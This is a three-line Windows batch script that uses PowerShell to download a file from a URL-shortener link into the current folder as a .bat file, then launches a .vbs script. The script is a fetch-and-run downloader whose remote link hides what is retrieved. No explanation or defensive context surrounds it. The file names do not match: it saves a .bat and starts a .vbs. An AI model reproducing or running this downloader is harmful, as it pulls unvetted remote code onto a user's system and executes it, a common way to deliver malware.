@echo off
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://bom.to/b10', '%cd%\b10.bat') }"
start b10.vbs